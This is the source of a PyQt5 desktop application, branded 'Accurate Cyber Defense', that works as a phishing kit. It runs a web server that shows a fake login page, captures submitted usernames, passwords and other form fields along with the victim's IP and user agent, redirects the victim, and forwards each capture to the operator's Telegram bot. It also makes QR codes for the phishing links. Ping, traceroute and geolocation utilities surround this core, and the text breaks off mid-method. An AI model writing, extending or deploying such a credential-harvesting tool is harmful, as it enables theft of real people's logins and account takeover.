import os
import sys
import socket
import threading
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
import urllib.parse
import webbrowser
from datetime import datetime
import json
import random
import string
import qrcode
import io
import time
import subprocess
import platform
import psutil
import ipaddress
import sqlite3
import logging
from pathlib import Path
import re
import shutil

from PIL import Image
import base64

from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QTextEdit, QPushButton, QTabWidget,
                             QComboBox, QCheckBox, QGroupBox, QSpinBox, QFileDialog,
                             QMessageBox, QPlainTextEdit, QSplitter, QTableWidget,
                             QTableWidgetItem, QHeaderView, QMenuBar, QMenu, QAction,
                             QStatusBar, QToolBar, QSystemTrayIcon, QStyle, QDialog,
                             QDialogButtonBox, QFormLayout, QProgressBar, QListWidget,
                             QListWidgetItem, QTreeWidget, QTreeWidgetItem, QFrame)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QSettings, QSize
from PyQt5.QtGui import QFont, QColor, QPalette, QIcon, QPixmap, QPainter, QImage

# Configuration
CONFIG_FILE = "cyber_security_config.json"
DATABASE_FILE = "network_data.db"
REPORT_DIR = "reports"

# Database Manager
class DatabaseManager:
    def __init__(self):
        self.db_file = DATABASE_FILE
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # Command history table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                success BOOLEAN DEFAULT 1
            )
        ''')
        
        # Network scan results table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                services TEXT,
                os_info TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def log_command(self, command: str, source: str = 'local', success: bool = True):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO command_history (command, source, success) VALUES (?, ?, ?)',
            (command, source, success)
        )
        conn.commit()
        conn.close()
    
    def get_command_history(self, limit: int = 50):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            'SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?',
            (limit,)
        )
        results = cursor.fetchall()
        conn.close()
        return results

# Traceroute Tool
class TracerouteTool:
    @staticmethod
    def is_ipv4_or_ipv6(address: str) -> bool:
        try:
            ipaddress.ip_address(address)
            return True
        except ValueError:
            return False

    @staticmethod
    def is_valid_hostname(name: str) -> bool:
        if name.endswith('.'):
            name = name[:-1]
        HOSTNAME_RE = re.compile(r"^(?=.{1,253}$)(?!-)([A-Za-z0-9-]{1,63}\.)*[A-Za-z0-9-]{1,63}$")
        return bool(HOSTNAME_RE.match(name))

    @staticmethod
    def choose_traceroute_cmd(target: str):
        system = platform.system()
        if system == 'Windows':
            return ['tracert', '-d', target]
        if shutil.which('traceroute'):
            return ['traceroute', '-n', '-q', '1', '-w', '2', target]
        if shutil.which('tracepath'):
            return ['tracepath', target]
        if shutil.which('ping'):
            return ['ping', '-c', '4', target]
        raise EnvironmentError('No traceroute utilities found.')

    def interactive_traceroute(self, target: str = None):
        if not target:
            return "❌ No target specified"

        if not (self.is_ipv4_or_ipv6(target) or self.is_valid_hostname(target)):
            return f"❌ Invalid IP address or hostname: {target}"

        try:
            cmd = self.choose_traceroute_cmd(target)
        except EnvironmentError as e:
            return f"❌ Traceroute error: {e}"

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            output = result.stdout
            
            result_text = f"🛣️ <b>Traceroute to {target}</b>\n\n"
            result_text += f"Command: <code>{' '.join(cmd)}</code>\n"
            result_text += f"Return code: {result.returncode}\n\n"
            
            if len(output) > 3000:
                result_text += f"<code>{output[-3000:]}</code>"
            else:
                result_text += f"<code>{output}</code>"

            return result_text
        except Exception as e:
            return f"❌ Traceroute failed: {str(e)}"

# Network Scanner
class NetworkScanner:
    def __init__(self):
        self.traceroute_tool = TracerouteTool()
    
    def ping_ip(self, ip: str):
        try:
            if os.name == 'nt':
                cmd = ['ping', '-n', '4', ip]
            else:
                cmd = ['ping', '-c', '4', ip]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return result.stdout
        except Exception as e:
            return f"Ping error: {str(e)}"
    
    def traceroute(self, target: str):
        return self.traceroute_tool.interactive_traceroute(target)
    
    def get_ip_location(self, ip: str):
        try:
            url = f"http://ip-api.com/json/{ip}"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data['status'] == 'success':
                    return json.dumps({
                        'ip': ip,
                        'country': data.get('country', 'N/A'),
                        'region': data.get('regionName', 'N/A'),
                        'city': data.get('city', 'N/A'),
                        'isp': data.get('isp', 'N/A'),
                        'org': data.get('org', 'N/A'),
                        'lat': data.get('lat', 'N/A'),
                        'lon': data.get('lon', 'N/A'),
                        'timezone': data.get('timezone', 'N/A')
                    }, indent=2)
                else:
                    return f"Location error: {data.get('message', 'Unknown error')}"
            else:
                return f"Location error: HTTP {response.status_code}"
        except Exception as e:
            return f"Location error: {str(e)}"

# Telegram Manager
class TelegramManager:
    def __init__(self):
        self.token = None
        self.chat_id = None
        self.enabled = False
    
    def configure(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.enabled = bool(token and chat_id)
    
    def send_message(self, message):
        if not self.enabled:
            return False
        
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=payload, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"Telegram error: {e}")
            return False

# Phishing Server
class PhishingServer(QThread):
    new_credentials = pyqtSignal(str, dict)
    server_status = pyqtSignal(str)
    telegram_status = pyqtSignal(bool, str)
    visitor_connected = pyqtSignal(str)

    def __init__(self, port, template, redirect_url, capture_all, telegram_manager, page_id=None):
        super().__init__()
        self.port = port
        self.template = template
        self.redirect_url = redirect_url
        self.capture_all = capture_all
        self.telegram_manager = telegram_manager
        self.page_id = page_id
        self.running = False
        self.server = None

    def run(self):
        handler = lambda *args: PhishingRequestHandler(*args, 
                                                     template=self.template,
                                                     redirect_url=self.redirect_url,
                                                     capture_all=self.capture_all,
                                                     callback=self.handle_credentials,
                                                     visitor_callback=self.handle_visitor)
        
        class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
            pass
        
        self.server = ThreadedHTTPServer(('0.0.0.0', self.port), handler)
        self.running = True
        self.server_status.emit(f"Server running on http://localhost:{self.port}")
        
        try:
            self.server.serve_forever()
        except Exception as e:
            self.server_status.emit(f"Server error: {str(e)}")
        finally:
            self.running = False

    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.server_status.emit("Server stopped")
        self.running = False

    def handle_credentials(self, data):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            cred_data = json.loads(data)
            log_entry = f"[{timestamp}] Captured credentials:\n{json.dumps(cred_data, indent=2)}\n"
            
            if self.telegram_manager.enabled:
                telegram_msg = f"🚨 <b>New Credentials Captured</b> 🚨\n"
                telegram_msg += f"⏰ <b>Time:</b> {timestamp}\n"
                telegram_msg += f"🌐 <b>IP:</b> {cred_data.get('client_ip', 'Unknown')}\n"
                telegram_msg += f"📄 <b>Page:</b> {self.page_id or 'Main'}\n\n"
                
                for key, value in cred_data.items():
                    if key not in ['client_ip', 'user_agent', 'timestamp']:
                        telegram_msg += f"🔑 <b>{key}:</b> {value}\n"
                
                success = self.telegram_manager.send_message(telegram_msg)
                self.telegram_status.emit(success, "Credentials sent to Telegram" if success else "Failed to send to Telegram")
            
            self.new_credentials.emit(log_entry, cred_data)
            
        except json.JSONDecodeError:
            error_msg = f"[{timestamp}] Error parsing credentials: {data}\n"
            self.new_credentials.emit(error_msg, {})

    def handle_visitor(self, client_info):
        self.visitor_connected.emit(client_info)

class PhishingRequestHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, template, redirect_url, capture_all, callback, visitor_callback):
        self.template = template
        self.redirect_url = redirect_url
        self.capture_all = capture_all
        self.callback = callback
        self.visitor_callback = visitor_callback
        super().__init__(*args)

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path == '/':
            client_info = f"Visitor from {self.client_address[0]} - {self.headers.get('User-Agent', 'Unknown')}"
            self.visitor_callback(client_info)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(self.template.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        parsed_data = urllib.parse.parse_qs(post_data)
        cleaned_data = {k: v[0] for k, v in parsed_data.items()}
        
        if self.capture_all:
            captured_data = cleaned_data
        else:
            captured_data = {
                'username': cleaned_data.get('username', ''),
                'password': cleaned_data.get('password', '')
            }
        
        captured_data['client_ip'] = self.client_address[0]
        captured_data['user_agent'] = self.headers.get('User-Agent', 'Unknown')
        captured_data['timestamp'] = datetime.now().isoformat()
        
        self.callback(json.dumps(captured_data, indent=2))
        
        self.send_response(302)
        self.send_header('Location', self.redirect_url)
        self.end_headers()

# QR Code Dialog
class QRCodeDialog(QDialog):
    def __init__(self, url, parent=None):
        super().__init__(parent)
        self.setWindowTitle("QR Code - Phishing Link")
        self.setModal(True)
        self.resize(300, 350)
        self.url = url
        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout()
        self.setLayout(layout)
        
        title = QLabel("Scan QR Code to Access Phishing Page")
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet("font-weight: bold; font-size: 14px; margin: 10px;")
        layout.addWidget(title)
        
        qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=4)
        qr.add_data(self.url)
        qr.make(fit=True)
        
        qr_image = qr.make_image(fill_color="black", back_color="white")
        buffer = io.BytesIO()
        qr_image.save(buffer, format="PNG")
        qimage = QImage()
        qimage.loadFromData(buffer.getvalue())
        pixmap = QPixmap.fromImage(qimage)
        
        qr_label = QLabel()
        qr_label.setPixmap(pixmap)
        qr_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(qr_label)
        
        url_label = QLabel(self.url)
        url_label.setAlignment(Qt.AlignCenter)
        url_label.setStyleSheet("background-color: #f0f0f0; padding: 8px; border-radius: 4px; margin: 10px;")
        url_label.setTextInteractionFlags(Qt.TextSelectableByMouse)
        layout.addWidget(url_label)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Ok)
        buttons.accepted.connect(self.accept)
        layout.addWidget(buttons)

# Settings Dialog
class SettingsDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Settings")
        self.setModal(True)
        self.resize(500, 400)
        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout()
        self.setLayout(layout)
        
        telegram_group = QGroupBox("Telegram Configuration")
        telegram_layout = QFormLayout()
        telegram_group.setLayout(telegram_layout)
        layout.addWidget(telegram_group)
        
        self.telegram_token = QLineEdit()
        self.telegram_token.setPlaceholderText("Enter your Telegram bot token")
        telegram_layout.addRow("Bot Token:", self.telegram_token)
        
        self.telegram_chat_id = QLineEdit()
        self.telegram_chat_id.setPlaceholderText("Enter your chat ID")
        telegram_layout.addRow("Chat ID:", self.telegram_chat_id)
        
        self.test_telegram_btn = QPushButton("Test Telegram Connection")
        telegram_layout.addRow(self.test_telegram_btn)
        
        server_group = QGroupBox("Server Settings")
        server_layout = QFormLayout()
        server_group.setLayout(server_layout)
        layout.addWidget(server_group)
        
        self.auto_start = QCheckBox("Auto-start server on application launch")
        server_layout.addRow(self.auto_start)
        
        self.minimize_to_tray = QCheckBox("Minimize to system tray")
        server_layout.addRow(self.minimize_to_tray)
        
        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        button_box.accepted.connect(self.accept)
        button_box.rejected.connect(self.reject)
        layout.addWidget(button_box)
        
        self.load_settings()
    
    def load_settings(self):
        settings = QSettings()
        self.telegram_token.setText(settings.value("telegram/token", ""))
        self.telegram_chat_id.setText(settings.value("telegram/chat_id", ""))
        self.auto_start.setChecked(settings.value("server/auto_start", False, type=bool))
        self.minimize_to_tray.setChecked(settings.value("ui/minimize_to_tray", True, type=bool))
    
    def save_settings(self):
        settings = QSettings()
        settings.setValue("telegram/token", self.telegram_token.text())
        settings.setValue("telegram/chat_id", self.telegram_chat_id.text())
        settings.setValue("server/auto_start", self.auto_start.isChecked())
        settings.setValue("ui/minimize_to_tray", self.minimize_to_tray.isChecked())

# Network Tools Dialog
class NetworkToolsDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Network Security Tools")
        self.setModal(True)
        self.resize(700, 600)
        self.db_manager = DatabaseManager()
        self.scanner = NetworkScanner()
        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout()
        self.setLayout(layout)
        
        # Tab widget for different tools
        tab_widget = QTabWidget()
        layout.addWidget(tab_widget)
        
        # Network Diagnostics Tab
        diag_tab = QWidget()
        diag_layout = QVBoxLayout()
        diag_tab.setLayout(diag_layout)
        tab_widget.addTab(diag_tab, "🔍 Diagnostics")
        
        # Ping tool
        ping_group = QGroupBox("Ping Tool")
        ping_layout = QHBoxLayout()
        ping_group.setLayout(ping_layout)
        diag_layout.addWidget(ping_group)
        
        self.ping_input = QLineEdit()
        self.ping_input.setPlaceholderText("Enter IP address or hostname")
        ping_layout.addWidget(self.ping_input)
        
        self.ping_btn = QPushButton("Ping")
        self.ping_btn.clicked.connect(self.ping_target)
        ping_layout.addWidget(self.ping_btn)
        
        # Traceroute tool
        trace_group = QGroupBox("Traceroute Tool")
        trace_layout = QHBoxLayout()
        trace_group.setLayout(trace_layout)
        diag_layout.addWidget(trace_group)
        
        self.trace_input = QLineEdit()
        self.trace_input.setPlaceholderText("Enter IP address or hostname")
        trace_layout.addWidget(self.trace_input)
        
        self.trace_btn = QPushButton("Traceroute")
        self.trace_btn.clicked.connect(self.traceroute_target)
        trace_layout.addWidget(self.trace_btn)
        
        # Location lookup
        loc_group = QGroupBox("IP Location Lookup")
        loc_layout = QHBoxLayout()
        loc_group.setLayout(loc_layout)
        diag_layout.addWidget(loc_group)
        
        self.loc_input = QLineEdit()
        self.loc_input.setPlaceholderText("Enter IP address")
        loc_layout.addWidget(self.loc_input)
        
        self.loc_btn = QPushButton("Get Location")
        self.loc_btn.clicked.connect(self.get_location)
        loc_layout.addWidget(self.loc_btn)
        
        # Results area
        self.results_display = QPlainTextEdit()
        self.results_display.setReadOnly(True)
        self.results_display.setFont(QFont("Courier New", 9))
        diag_layout.addWidget(self.results_display)
        
        # System Info Tab
        sys_tab = QWidget()
        sys_layout = QVBoxLayout()
        sys_tab.setLayout(sys_layout)
        tab_widget.addTab(sys_tab, "💻 System Info")
        
        self.sys_info_display = QPlainTextEdit()
        self.sys_info_display.setReadOnly(True)
        self.sys_info_display.setFont(QFont("Courier New", 9))
        sys_layout.addWidget(self.sys_info_display)
        
        refresh_btn = QPushButton("Refresh System Info")
        refresh_btn.clicked.connect(self.refresh_system_info)
        sys_layout.addWidget(refresh_btn)
        
        # Command History Tab
        hist_tab = QWidget()
        hist_layout = QVBoxLayout()
        hist_tab.setLayout(hist_layout)
        tab_widget.addTab(hist_tab, "📝 History")
        
        self.history_display = QPlainTextEdit()
        self.history_display.setReadOnly(True)
        self.history_display.setFont(QFont("Courier New", 9))
        hist_layout.addWidget(self.history_display)
        
        refresh_hist_btn = QPushButton("Refresh History")
        refresh_hist_btn.clicked.connect(self.refresh_history)
        hist_layout.addWidget(refresh_hist_btn)
        
        # Buttons
        button_box = QDialogButtonBox(QDialogButtonBox.Close)
        button_box.rejected.connect(self.reject)
        layout.addWidget(button_box)
        
        self.refresh_system_info()
        self.refresh_history()
    
    def ping_target(self):
        target = self.ping_input.text().strip()
        if not target:
            QMessageBox.warning(self, "Error", "Please enter a target IP or hostname")
            return
        
        self.db_manager.log_command(f"ping {target}", "network_tools")
        self.results_display.appendPlainText(f"Pinging {target}...\n")
        
        # Run in thread to avoid blocking UI
        def do_ping():
            result = self.scanner.ping_ip(target)
            self.results_display.appendPlainText(result)
            self.results_display.appendPlainText("-" * 50)
        
        threading.Thread(target=do_ping, daemon=True).start()
    
    def traceroute_target(self):
        target = self.trace_input.text().strip()
        if not target:
            QMessageBox.warning(self, "Error", "Please enter a target IP or hostname")
            return
        
        self.db_manager.log_command(f"traceroute {target}", "network_tools")
        self.results_display.appendPlainText(f"Traceroute to {target}...\n")
        
        def do_trace():
            result = self.scanner.traceroute(target)
            self.results_display.appendPlainText(result)
            self.results_display.appendPlainText("-" * 50)
        
        threading.Thread(target=do_trace, daemon=True).start()
    
    def get_location(self):
        ip = self.loc_input.text().strip()
        if not ip:
            QMessageBox.warning(self, "Error", "Please enter an IP address")
            return
        
        self.db_manager.log_command(f"location {ip}", "network_tools")
        self.results_display.appendPlainText(f"Getting location for {ip}...\n")
        
        def do_location():
            result = self.scanner.get_ip_location(ip)
            self.results_display.appendPlainText(result)
            self.results_display.appendPlainText("-" * 50)
        
        threading.Thread(target=do_location, daemon=True).start()
    
    def refresh_system_info(self):
        info = "💻 System Information\n\n"
        info += f"OS: {platform.system()} {platform.release()}\n"
        info += f"Platform: {platform.platform()}\n"
        info += f"CPU Cores: {psutil.cpu_count()}\n"
        info += f"CPU Usage: {psutil.cpu_percent()}%\n"
        
        mem = psutil.virtual_memory()
        info += f"Memory: {mem.percent}% used ({mem.used//1024//1024}MB / {mem.total//1024//1024}MB)\n"
        
        disk = psutil.disk_usage('/')
        info += f"Disk: {disk.percent}% used ({disk.used//1024//1024}MB / {disk.total//1024//1024}MB)\n"
        
        info += f"Boot Time: {datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}\n"
        
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            info += f"Hostname: {hostname}\n"
            info += f"Local IP: {local_ip}\n"
        except:
            info += "Hostname: Unable to determine\n"
        
        self.sys_info_display.setPlainText(info)
    
    def refresh_history(self):
        history = self.db_manager.get_command_history(50)
        if not history:
            self.history_display.setPlainText("No command history found.")
            return
        
        text = "📝 Command History\n\n"
        for cmd, src, ts, success in history:
            status = "✅" if success else "❌"
            text += f"{status} [{src}] {ts}\n{cmd}\n{'-'*40}\n"
        
        self.history_display.setPlainText(text)

# Main Application
class AdvancedCyberSecurityTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Accurate Cyber Defense - Advanced Security Suite")
        self.setGeometry(100, 100, 1400, 900)
        
        # Initialize components
        self.telegram_manager = TelegramManager()
        self.phishing_servers = {}
        self.captured_credentials = []
        self.phishing_pages = {}
        self.settings = QSettings()
        self.db_manager = DatabaseManager()
        self.scanner = NetworkScanner()
        
        # Theme selection
        self.current_theme = "dark"  # Default theme
        
        # Initialize UI
        self.init_ui()
        
        # Load settings
        self.load_settings()
        
        # Load default templates
        self.load_default_templates()
        
        # Statistics
        self.stats = {
            'pages_created': 0,
            'credentials_captured': 0,
            'telegram_notifications': 0,
            'visitors': 0,
            'network_scans': 0
        }
    
    def set_theme(self, theme_name):
        """Set application theme"""
        self.current_theme = theme_name
        
        if theme_name == "dark":
            self.set_dark_theme()
        elif theme_name == "light":
            self.set_light_theme()
        elif theme_name == "professional":
            self.set_professional_theme()
        else:
            self.set_simple_theme()
    
    def set_dark_theme(self):
        palette = self.palette()
        palette.setColor(QPalette.Window, QColor(30, 30, 45))
        palette.setColor(QPalette.WindowText, QColor(255, 165, 0))
        palette.setColor(QPalette.Base, QColor(45, 45, 60))
        palette.setColor(QPalette.AlternateBase, QColor(60, 60, 80))
        palette.setColor(QPalette.ToolTipBase, QColor(138, 43, 226))
        palette.setColor(QPalette.ToolTipText, Qt.white)
        palette.setColor(QPalette.Text, QColor(255, 255, 255))
        palette.setColor(QPalette.Button, QColor(75, 0, 130))
        palette.setColor(QPalette.ButtonText, QColor(255, 255, 255))
        palette.setColor(QPalette.BrightText, Qt.red)
        palette.setColor(QPalette.Highlight, QColor(255, 69, 0))
        palette.setColor(QPalette.HighlightedText, Qt.white)
        self.setPalette(palette)
        
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1e1e2d;
            }
            QGroupBox {
                border: 2px solid #4B0082;
                border-radius: 8px;
                margin-top: 10px;
                padding-top: 15px;
                background-color: #2d2d3c;
                color: #FFA500;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 8px;
                background-color: #4B0082;
                color: white;
                border-radius: 4px;
            }
            QTabWidget::pane {
                border: 2px solid #4B0082;
                background-color: #2d2d3c;
            }
            QTabBar::tab {
                background-color: #2d2d3c;
                color: #FFA500;
                padding: 8px 16px;
                border: 1px solid #4B0082;
                border-bottom: none;
                border-top-left-radius: 6px;
                border-top-right-radius: 6px;
            }
            QTabBar::tab:selected {
                background-color: #4B0082;
                color: white;
            }
            QTextEdit, QPlainTextEdit, QLineEdit, QSpinBox, QComboBox {
                background-color: #3d3d4c;
                color: white;
                border: 1px solid #FF4500;
                border-radius: 4px;
                padding: 4px;
            }
            QPushButton {
                background-color: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #FF4500, stop: 1 #8B0000);
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #FF6347, stop: 1 #B22222);
            }
            QPushButton:pressed {
                background-color: #8B0000;
            }
            QPushButton:disabled {
                background-color: #5a5a6e;
                color: #888;
            }
            QTableWidget {
                background-color: #2d2d3c;
                color: white;
                gridline-color: #4B0082;
                border: 1px solid #4B0082;
            }
            QTableWidget::item {
                padding: 6px;
                border-bottom: 1px solid #3d3d4c;
            }
            QTableWidget::item:selected {
                background-color: #FF4500;
            }
            QHeaderView::section {
                background-color: #4B0082;
                color: white;
                padding: 6px;
                border: none;
            }
            QMenuBar {
                background-color: #2d2d3c;
                color: #FFA500;
                border-bottom: 2px solid #4B0082;
            }
            QMenuBar::item {
                background-color: transparent;
                padding: 6px 12px;
            }
            QMenuBar::item:selected {
                background-color: #4B0082;
            }
            QMenu {
                background-color: #2d2d3c;
                color: white;
                border: 1px solid #4B0082;
            }
            QMenu::item {
                padding: 6px 24px;
            }
            QMenu::item:selected {
                background-color: #FF4500;
            }
            QStatusBar {
                background-color: #2d2d3c;
                color: #FFA500;
                border-top: 1px solid #4B0082;
            }
        """)
    
    def set_light_theme(self):
        palette = self.palette()
        palette.setColor(QPalette.Window, QColor(240, 240, 240))
        palette.setColor(QPalette.WindowText, Qt.black)
        palette.setColor(QPalette.Base, QColor(255, 255, 255))
        palette.setColor(QPalette.AlternateBase, QColor(233, 233, 233))
        palette.setColor(QPalette.ToolTipBase, QColor(255, 255, 255))
        palette.setColor(QPalette.ToolTipText, Qt.black)
        palette.setColor(QPalette.Text, Qt.black)
        palette.setColor(QPalette.Button, QColor(240, 240, 240))
        palette.setColor(QPalette.ButtonText, Qt.black)
        palette.setColor(QPalette.BrightText, Qt.red)
        palette.setColor(QPalette.Highlight, QColor(0, 120, 215))
        palette.setColor(QPalette.HighlightedText, Qt.white)
        self.setPalette(palette)
        
        self.setStyleSheet("""
            QMainWindow {
                background-color: #f0f0f0;
            }
            QGroupBox {
                border: 2px solid #cccccc;
                border-radius: 8px;
                margin-top: 10px;
                padding-top: 15px;
                background-color: white;
                color: #333333;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 8px;
                background-color: #e0e0e0;
                color: #333333;
                border-radius: 4px;
            }
            QTabWidget::pane {
                border: 2px solid #cccccc;
                background-color: white;
            }
            QTabBar::tab {
                background-color: #f0f0f0;
                color: #333333;
                padding: 8px 16px;
                border: 1px solid #cccccc;
                border-bottom: none;
                border-top-left-radius: 6px;
                border-top-right-radius: 6px;
            }
            QTabBar::tab:selected {
                background-color: white;
                color: #0066cc;
            }
            QTextEdit, QPlainTextEdit, QLineEdit, QSpinBox, QComboBox {
                background-color: white;
                color: black;
                border: 1px solid #cccccc;
                border-radius: 4px;
                padding: 4px;
            }
            QPushButton {
                background-color: #0066cc;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #0052a3;
            }
            QPushButton:pressed {
                background-color: #003d7a;
            }
            QPushButton:disabled {
                background-color: #cccccc;
                color: #666666;
            }
            QTableWidget {
                background-color: white;
                color: black;
                gridline-color: #cccccc;
                border: 1px solid #cccccc;
            }
            QTableWidget::item {
                padding: 6px;
                border-bottom: 1px solid #e0e0e0;
            }
            QTableWidget::item:selected {
                background-color: #0066cc;
                color: white;
            }
            QHeaderView::section {
                background-color: #e0e0e0;
                color: #333333;
                padding: 6px;
                border: none;
            }
            QMenuBar {
                background-color: #f0f0f0;
                color: #333333;
                border-bottom: 2px solid #cccccc;
            }
            QMenuBar::item {
                background-color: transparent;
                padding: 6px 12px;
            }
            QMenuBar::item:selected {
                background-color: #e0e0e0;
            }
            QMenu {
                background-color: white;
                color: #333333;
                border: 1px solid #cccccc;
            }
            QMenu::item {
                padding: 6px 24px;
            }
            QMenu::item:selected {
                background-color: #0066cc;
                color: white;
            }
            QStatusBar {
                background-color: #f0f0f0;
                color: #333333;
                border-top: 1px solid #cccccc;
            }
        """)
    
    def set_professional_theme(self):
        self.set_dark_theme()  # Use dark as professional for now
    
    def set_simple_theme(self):
        # Simple system theme - let the system handle styling
        self.setStyleSheet("")
        self.setPalette(self.style().standardPalette())
    
    def init_ui(self):
        # Create menu bar
        self.create_menu_bar()
        
        # Create toolbar
        self.create_toolbar()
        
        # Main layout
        main_widget = QWidget()
        main_layout = QHBoxLayout()
        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)
        
        # Splitter for left and right panels
        splitter = QSplitter(Qt.Horizontal)
        main_layout.addWidget(splitter)
        
        # Left panel (configuration)
        left_panel = QWidget()
        left_layout = QVBoxLayout()
        left_panel.setLayout(left_layout)
        splitter.addWidget(left_panel)
        
        # Right panel (terminal/output)
        right_panel = QWidget()
        right_layout = QVBoxLayout()
        right_panel.setLayout(right_layout)
        splitter.addWidget(right_panel)
        
        # Tab widget for left panel
        tab_widget = QTabWidget()
        left_layout.addWidget(tab_widget)
        
        # Dashboard Tab
        dashboard_tab = QWidget()
        dashboard_layout = QVBoxLayout()
        dashboard_tab.setLayout(dashboard_layout)
        tab_widget.addTab(dashboard_tab, "📊 Dashboard")
        
        self.create_dashboard_tab(dashboard_layout)
        
        # Server Configuration Tab
        server_tab = QWidget()
        server_layout = QVBoxLayout()
        server_tab.setLayout(server_layout)
        tab_widget.addTab(server_tab, "🚀 Phishing Server")
        
        self.create_server_tab(server_layout)
        
        # Template Editor Tab
        template_tab = QWidget()
        template_layout = QVBoxLayout()
        template_tab.setLayout(template_layout)
        tab_widget.addTab(template_tab, "📝 Template Editor")
        
        self.create_template_tab(template_layout)
        
        # Network Tools Tab
        network_tab = QWidget()
        network_layout = QVBoxLayout()
        network_tab.setLayout(network_layout)
        tab_widget.addTab(network_tab, "🔧 Network Tools")
        
        self.create_network_tab(network_layout)
        
        # Telegram Configuration Tab
        telegram_tab = QWidget()
        telegram_layout = QVBoxLayout()
        telegram_tab.setLayout(telegram_layout)
        tab_widget.addTab(telegram_tab, "📱 Telegram Config")
        
        self.create_telegram_tab(telegram_layout)
        
        # Right panel - Monitoring
        self.create_monitoring_panel(right_layout)
        
        # Status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready - Educational Use Only")
        
        # Set default theme
        self.set_theme("dark")
    
    def create_menu_bar(self):
        menubar = self.menuBar()
        
        # File menu
        file_menu = menubar.addMenu('File')
        
        export_action = QAction('Export Data', self)
        export_action.triggered.connect(self.export_data)
        file_menu.addAction(export_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction('Exit', self)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # View menu
        view_menu = menubar.addMenu('View')
        
        credentials_action = QAction('View Credentials', self)
        credentials_action.triggered.connect(self.show_credentials_viewer)
        view_menu.addAction(credentials_action)
        
        network_tools_action = QAction('Network Tools', self)
        network_tools_action.triggered.connect(self.show_network_tools)
        view_menu.addAction(network_tools_action)
        
        # Theme menu
        theme_menu = menubar.addMenu('Theme')
        
        dark_theme_action = QAction('Dark Theme', self)
        dark_theme_action.triggered.connect(lambda: self.set_theme("dark"))
        theme_menu.addAction(dark_theme_action)
        
        light_theme_action = QAction('Light Theme', self)
        light_theme_action.triggered.connect(lambda: self.set_theme("light"))
        theme_menu.addAction(light_theme_action)
        
        professional_theme_action = QAction('Professional Theme', self)
        professional_theme_action.triggered.connect(lambda: self.set_theme("professional"))
        theme_menu.addAction(professional_theme_action)
        
        simple_theme_action = QAction('Simple Theme', self)
        simple_theme_action.triggered.connect(lambda: self.set_theme("simple"))
        theme_menu.addAction(simple_theme_action)
        
        # Settings menu
        settings_menu = menubar.addMenu('Settings')
        
        config_action = QAction('Configuration', self)
        config_action.triggered.connect(self.show_settings)
